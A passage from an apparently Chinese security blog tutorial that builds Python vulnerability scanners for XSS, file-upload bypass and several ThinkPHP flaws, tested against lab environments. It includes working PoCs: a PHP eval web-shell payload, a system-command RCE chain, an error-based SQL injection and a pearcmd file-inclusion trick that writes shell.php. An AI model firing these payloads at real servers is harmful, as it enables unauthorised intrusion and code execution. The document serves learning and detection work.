class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> requests.get(url=target_url,params=data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">xss_scan</span>(<span class="hljs-params">url</span>):<br>    forms = get_all_forms(url)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;正在检查<span class="hljs-subst">&#123;url&#125;</span>&quot;</span>)<br>    xss_payload = <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;r1ckyL&#x27;)&lt;/script&gt;&quot;</span><br>    <span class="hljs-comment">#标记是否存在xss漏洞</span><br>    is_vul = <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">for</span> form <span class="hljs-keyword">in</span> forms:<br>        form_details = get_form_details(form)<br>        content = submit_form(form_details,url,xss_payload).content.decode()<br>        <span class="hljs-keyword">if</span> xss_payload <span class="hljs-keyword">in</span> content:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;url&#125;</span>可能存在xss漏洞&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;表单详细信息：&quot;</span>)<br>            <span class="hljs-built_in">print</span>(form_details)<br>            is_vul = <span class="hljs-literal">True</span><br>            <span class="hljs-keyword">break</span><br><br>    <span class="hljs-keyword">return</span> is_vul<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    url = <span class="hljs-string">&quot;http://39.101.162.123:10764/level2.php?keyword=test&quot;</span><br>    xss_scan(url)<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231128111645684.png" alt="image-20231128111645684"></p><h2 id="文件上传扫描器"><a href="#文件上传扫描器" class="headerlink" title="文件上传扫描器"></a>文件上传扫描器</h2><p>思路：</p><p>1.找到上传文件的url</p><p>2.发送文件（存在黑名单  bypass）</p><p>3.找到上传成功返回的提示信息和路径</p><p>以文件上传靶场upload-lab 第一关做测试</p><p>根据上传的表单参数定制上传代码：</p><p><img src="/img/image-20231128145905477.png" alt="image-20231128145905477"> </p><p>文件上传代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(image_url,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    <span class="hljs-comment">#构建文件上传的参数</span><br>    files = &#123;<span class="hljs-string">&quot;upload_file&quot;</span>:file&#125;<br>    data = &#123;<span class="hljs-string">&quot;submit&quot;</span>:<span class="hljs-string">&quot;true&quot;</span>&#125;<br>    response = requests.post(upload_url,files=files,data=data)<br></code></pre></td></tr></table></figure><p>常见php bypass：</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smali">Php php3 Ph phtml php5 php6 pht phtm<br></code></pre></td></tr></table></figure><p>此处上传成功会有图片相对路径：  将&#x2F;upload作为成功标识</p><p><img src="/img/image-20231128151303159.png" alt="image-20231128151303159"> </p><p>整体代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_file_upload</span>(<span class="hljs-params">url,image_path,fuzz_file_extensions</span>):<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment">#读取图片文件内容</span><br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(image_path,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>            <span class="hljs-comment">#构建文件上传的参数</span><br>            <span class="hljs-keyword">for</span> extension <span class="hljs-keyword">in</span> fuzz_file_extensions:<br>                image_filename = <span class="hljs-string">f&quot;image.<span class="hljs-subst">&#123;extension&#125;</span>&quot;</span><br>                files = &#123;<span class="hljs-string">&quot;upload_file&quot;</span>:(image_filename,file)&#125;<br>                data = &#123;<span class="hljs-string">&quot;submit&quot;</span>:<span class="hljs-string">&quot;true&quot;</span>&#125;<br>                response = requests.post(upload_url,files=files,data=data)<br>                <span class="hljs-comment">#检测响应中有无上传成功的特定标识</span><br>                <span class="hljs-comment">#此处为图片的相对路径 /upload/xxx</span><br>                <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;/upload&quot;</span> <span class="hljs-keyword">in</span> response.text:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;可能存在文件上传漏洞，上传文件名为：<span class="hljs-subst">&#123;image_filename&#125;</span>&quot;</span>)<br>                    <span class="hljs-keyword">break</span><br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;未检测出文件上传漏洞&quot;</span>)<br>    <span class="hljs-keyword">except</span> FileNotFoundError:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;错误，文件<span class="hljs-subst">&#123;image_filename&#125;</span>未找到&quot;</span>)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;发生错误<span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    upload_url = <span class="hljs-string">&quot;http://39.101.162.123:37614/Pass-01/index.php&quot;</span><br>    image_url = <span class="hljs-string">&quot;D:\\SRC\\文件相关test\\test2.jpg&quot;</span><br>    <span class="hljs-comment">#要进行fuzz的文件扩展名</span><br>    fuzz_file_extensions = [<span class="hljs-string">&#x27;Php&#x27;</span>,<span class="hljs-string">&#x27;php3&#x27;</span>,<span class="hljs-string">&#x27;phtml&#x27;</span>,<span class="hljs-string">&#x27;Ph&#x27;</span>]<br>    check_file_upload(upload_url,image_url,fuzz_file_extensions)<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231128152420735.png" alt="image-20231128152420735"> </p><p><img src="/img/image-20231128152331007.png" alt="image-20231128152331007"></p><p>待优化：</p><p>1.文件扩展名bypass，可能不是php</p><p>2.上传成功的返回不一样（可做成-u参数选择）</p><h2 id="ThinkPHP漏洞扫描器"><a href="#ThinkPHP漏洞扫描器" class="headerlink" title="ThinkPHP漏洞扫描器"></a>ThinkPHP漏洞扫描器</h2><h3 id="2-x-代码执行漏洞"><a href="#2-x-代码执行漏洞" class="headerlink" title="2.x 代码执行漏洞"></a>2.x 代码执行漏洞</h3><p>2.x版本里面 preg_relace的&#x2F;e来匹配这个路由，导致用户输入参数被插入了双引号中，造成了任意代码执行</p><p>preg_relace(“正则规则”，”替换字符”，”目标字符”）</p><p>漏洞处：</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nsis"><span class="hljs-variable">$res</span> = preg_replace(<span class="hljs-string">&#x27;@(\w+)&#x27;</span>.<span class="hljs-variable">$depr.</span><span class="hljs-string">&#x27;([^&#x27;</span>.<span class="hljs-variable">$depr.</span><span class="hljs-string">&#x27;\/]+)@e&#x27;</span>, <span class="hljs-string">&#x27;<span class="hljs-variable">$var</span>[\&#x27;</span>\\<span class="hljs-number">1</span>\<span class="hljs-string">&#x27;]=&quot;\\2&quot;;&#x27;</span>, implode(<span class="hljs-variable">$depr</span>,<span class="hljs-variable">$paths</span>))<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>POC：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">/<span class="hljs-string">?s</span>=<span class="hljs-regexp">/Index/index</span><span class="hljs-regexp">/xxx/</span><span class="hljs-variable">$&#123;</span><span class="hljs-variable">@print</span>(eval(<span class="hljs-variable">$_POST</span>[cmd]))&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231129150316839.png" alt="image-20231129150316839"> </p><p>测试代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urljoin<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">thinkphp2_rce</span>(<span class="hljs-params">url</span>):<br>    payload = <span class="hljs-string">&quot;?s=/Index/index/xxx/$&#123;var_dump(md5(123))&#125;&quot;</span><br>    url = urljoin(url,payload)<br>    response = requests.get(url)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;202cb962ac59&#x27;</span> <span class="hljs-keyword">in</span> response.text:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;漏洞存在&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;漏洞不存在&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    url = <span class="hljs-string">&quot;http://10.210.100.131:8080/&quot;</span><br>    thinkphp2_rce(url)<br></code></pre></td></tr></table></figure><h3 id="5-0-23-RCE"><a href="#5-0-23-RCE" class="headerlink" title="5.0.23 RCE"></a>5.0.23 RCE</h3><p>其5.0.23以前的版本中，获取method的方法中没有正确处理方法名，导致攻击者可以调用Request类任意方法并构造利用链，从而导致远程代码执行漏洞</p><img src="/img/image-20231129151638745.png" alt="image-20231129151638745" style="zoom:67%;" /> <p>POC:</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">_method=__construct&amp;filter[]=system&amp;<span class="hljs-keyword">method</span>=<span class="hljs-title function_">get</span>&amp;<span class="hljs-title function_">server</span>[<span class="hljs-title function_">REQUEST_METHOD</span>]=<span class="hljs-title function_">id</span><br><span class="hljs-title function_">url</span>:/<span class="hljs-keyword">index</span>.php?s=captcha<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231129152121007.png" alt="image-20231129152121007"></p><p>测试代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urljoin<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">thinkphp_5023_rce</span>(<span class="hljs-params">url</span>):<br>    headers=&#123;<br>        <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36&#x27;</span>,<br>        <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/x-www-form-urlencoded&#x27;</span><br>    &#125;<br>    <span class="hljs-comment">#方法二，将payload拆开写成headers的键值对形式传入</span><br>    url1 = url+<span class="hljs-string">&#x27;/index.php?s=captcha&#x27;</span><br>    target = urljoin(url,url1)<br>    payload = <span class="hljs-string">r&#x27;_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=id&#x27;</span><br>    response = requests.post(url=target,data=payload,headers=headers)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;uid=&quot;</span> <span class="hljs-keyword">in</span> response.text:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;漏洞存在&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;漏洞不存在&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    url = <span class="hljs-string">&quot;http://10.210.100.131:8080&quot;</span><br>    thinkphp_5023_rce(url)<br></code></pre></td></tr></table></figure><h3 id="5-5-0-22-5-1-29-RCE"><a href="#5-5-0-22-5-1-29-RCE" class="headerlink" title="5-5.0.22&#x2F;5.1.29 RCE"></a>5-5.0.22&#x2F;5.1.29 RCE</h3><p>原理：<br>由于框架在处理控制器中的函数参数时，未正确过滤和验证输入，导致攻击者可以构造特定的输入数据，从而触发远程代码执行漏洞。</p><p>poc:</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sas">/<span class="hljs-keyword">index</span>.php?s=/<span class="hljs-keyword">Index</span>/\think\app/invokefunction<span class="hljs-variable">&amp;function</span>=call_user_func_array<span class="hljs-variable">&amp;vars</span>[0]=phpinfo<span class="hljs-variable">&amp;vars</span>[1][]=-1%20and%20it%27ll%20execute%20the%20phpinfo<br><br>s=/<span class="hljs-keyword">Index</span>/\think\app/invokefunction<span class="hljs-variable">&amp;function</span>=call_user_func_array<span class="hljs-variable">&amp;vars</span>[0]=md5<span class="hljs-variable">&amp;vars</span>[1][]=123<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231129155934533.png" alt="image-20231129155934533"></p><p><img src="/img/image-20231129160458566.png" alt="image-20231129160458566"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urljoin<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">thinkphp5x_rce</span>(<span class="hljs-params">url</span>):<br>    poc = <span class="hljs-string">r&quot;/index.php?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=md5&amp;vars[1][]=123&quot;</span><br>    payload = urljoin(url,poc)<br>    response = requests.get(payload,verify=<span class="hljs-literal">False</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;202cb962ac590&quot;</span> <span class="hljs-keyword">in</span> response.text:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;漏洞存在&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;漏洞不存在&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    url = <span class="hljs-string">&quot;http://10.210.100.131:8080&quot;</span><br>    thinkphp5x_rce(url)<br></code></pre></td></tr></table></figure><h3 id="5-0-9-sql注入和敏感信息泄露"><a href="#5-0-9-sql注入和敏感信息泄露" class="headerlink" title="5.0.9 sql注入和敏感信息泄露"></a>5.0.9 sql注入和敏感信息泄露</h3><p>原理：<br>传入的某参数在绑定编译指令的时候又没有安全处理，预编译的时候导致SQL异常报错。然而thinkphp5默认开启debug模式，在漏洞环境下构造错误的SQL语法会泄漏数据库账户和密码。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">poc：<br>/<span class="hljs-keyword">index</span>.php?ids[]=<span class="hljs-number">1</span>&amp;ids[]=<span class="hljs-number">2</span><br>/<span class="hljs-keyword">index</span>.php?ids[<span class="hljs-number">0</span>,updatexml(<span class="hljs-number">0</span>,concat(<span class="hljs-number">0xa</span>,<span class="hljs-keyword">user</span>()),<span class="hljs-number">0</span>)]=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231129163116934.png" alt="image-20231129163116934"> </p><p><img src="/img/image-20231129163145436.png" alt="image-20231129163145436"></p><p>测试代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urljoin<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">thinkphp5_sql</span>(<span class="hljs-params">url</span>):<br>    payload = urljoin(url,<span class="hljs-string">&#x27;/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1&#x27;</span>)<br>    response = requests.get(payload,verify=<span class="hljs-literal">False</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;XPATH syntax error&quot;</span> <span class="hljs-keyword">in</span> response.text:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;漏洞存在&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;漏洞不存在&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    url = <span class="hljs-string">&quot;http://10.210.100.131:80&quot;</span><br>    thinkphp5_sql(url)<br>    <br></code></pre></td></tr></table></figure><h3 id="6-0-12-多语言本地文件包含漏洞"><a href="#6-0-12-多语言本地文件包含漏洞" class="headerlink" title="6.0.12 多语言本地文件包含漏洞"></a>6.0.12 多语言本地文件包含漏洞</h3><p>目录穿越+文件包含</p><p>pearcmd 包含trick  实现 RCE</p><p>利用条件：<br>多语言模块开启<br>安装了pear拓展<br>知道pearcmd.php的路径</p><p>poc：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">index.php?+config-create+<span class="hljs-regexp">/&amp;lang=../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../u</span>sr<span class="hljs-regexp">/local/</span>lib<span class="hljs-regexp">/php/</span>pearcmd&amp;/&lt;?=phpinfo()?&gt;+shell.php<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231129164512634.png" alt="image-20231129164512634"></p><p>执行之后写入了shell.php，如果可以访问shell.php则存在漏洞</p><p>测试代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urljoin<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">thinkphp5_lang</span>(<span class="hljs-params">url</span>):<br>    payload = urljoin(url,<span class="hljs-string">&#x27;index.php?+config-create+/&amp;lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&amp;/&lt;?=phpinfo()?&gt;+shell.php&#x27;</span>)<br>    response = requests.get(url=payload,verify=<span class="hljs-literal">False</span>)<br>    url2 = urljoin(url,<span class="hljs-string">&#x27;/shell.php&#x27;</span>)<br>    response2 = requests.get(url2,verify=<span class="hljs-literal">False</span>)<br>    <span class="hljs-keyword">if</span> response2.status_code == <span class="hljs-number">200</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;漏洞存在&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;漏洞不存在&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    url = <span class="hljs-string">&quot;http://10.210.100.131:8080&quot;</span><br>    thinkphp5_lang(url)<br></code></pre></td></tr></table></figure><h3 id="整合–thinkphp漏洞综合扫描器"><a href="#整合–thinkphp漏洞综合扫描器" class="headerlink" title="整合–thinkphp漏洞综合扫描器"></a>整合–thinkphp漏洞综合扫描器</h3><p>在vulhub启5个漏洞环境</p><p><img src="/img/image-20231129165836860.png" alt="image-20231129165836860"></p><p>tp_scan实现思路</p><p>1.传参  argparse</p><p>2.时间  datetime</p><p>3.输出（美观） rich</p><p>4.写成类  ，类中定义对每个漏洞的检测函数，并使用字典记录信息，最后作为结果返回</p><p>测试单个 漏洞检测：</p><p><img src="/img/image-20231129174644010.png" alt="image-20231129174644010"> </p><p>目录结构：</p><p><img src="/img/image-20231129181517313.png" alt="image-20231129181517313"> </p><p>main.py:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urljoin<br><span class="hljs-keyword">import</span> argparse<br><span class="hljs-keyword">import</span> datetime<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> beautifyPrint <span class="hljs-keyword">as</span> rprint<br><span class="hljs-keyword">from</span> tpScan <span class="hljs-keyword">import</span> start_scan<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_time</span>():<br>    <span class="hljs-keyword">return</span> datetime.datetime.now().strftime(<span class="hljs-string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    parser = argparse.ArgumentParser(description=<span class="hljs-string">&quot;thinkphp综合漏扫器&quot;</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;-url&#x27;</span>,<span class="hljs-string">&#x27;--url&#x27;</span>,<span class="hljs-built_in">type</span>=<span class="hljs-built_in">str</span>,<span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;请输入目标url&quot;</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;-file&#x27;</span>,<span class="hljs-string">&#x27;--file&#x27;</span>,<span class="hljs-built_in">type</span>=<span class="hljs-built_in">str</span>,<span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;请输入待检测的txt文件&quot;</span>)<br>    args = parser.parse_args()<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;-url&#x27;</span> <span class="hljs-keyword">in</span> sys.argv:<br>        rprint.info(get_time(),<span class="hljs-string">&quot;thinkphp漏洞扫描开始&quot;</span>)<br>        start_scan(args.url)<br>        rprint.info(get_time(),<span class="hljs-string">&quot;thinkphp漏洞扫描结束&quot;</span>)<br>    <span class="hljs-keyword">elif</span> <span class="hljs-string">&#x27;-file&#x27;</span> <span class="hljs-keyword">in</span> sys.argv:<br>        file = <span class="hljs-built_in">open</span>(args.file,<span class="hljs-string">&quot;r&quot;</span>)<br>        rprint.info(get_time(),<span class="hljs-string">&quot;thinkphp漏洞扫描开始&quot;</span>)<br>        <span class="hljs-keyword">for</span> url <span class="hljs-keyword">in</span> file:<br>            <span class="hljs-built_in">print</span>(url)<br>            start_scan(url)<br>        rprint.info(get_time(),<span class="hljs-string">&quot;thinkphp漏洞扫描结束&quot;</span>)<br></code></pre></td></tr></table></figure><p>beautifyPrint.py：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> rich <span class="hljs-keyword">import</span> <span class="hljs-built_in">print</span> <span class="hljs-keyword">as</span> rprint<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">error</span>(<span class="hljs-params">date, body</span>):<br>    rprint(<span class="hljs-string">&quot;[[bold green]&quot;</span> + date + <span class="hljs-string">&quot;[/bold green]] [[bold red]Error[/bold red]] &gt; [bold yellow]&quot;</span> + body + <span class="hljs-string">&quot;[/bold yellow]&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">success</span>(<span class="hljs-params">date, body</span>):<br>    rprint(<span class="hljs-string">&quot;[[bold green]&quot;</span> + date + <span class="hljs-string">&quot;[/bold green]] [[bold green]Success[/bold green]] &gt; &quot;</span> + body)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">info</span>(<span class="hljs-params">date, body</span>):<br>    rprint(<span class="hljs-string">&quot;[[bold green]&quot;</span> + date + <span class="hljs-string">&quot;[/bold green]] [[bold blue]Info[/bold blue]] &gt; &quot;</span> + body)<br></code></pre></td></tr></table></figure><p>tpScan.py:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span 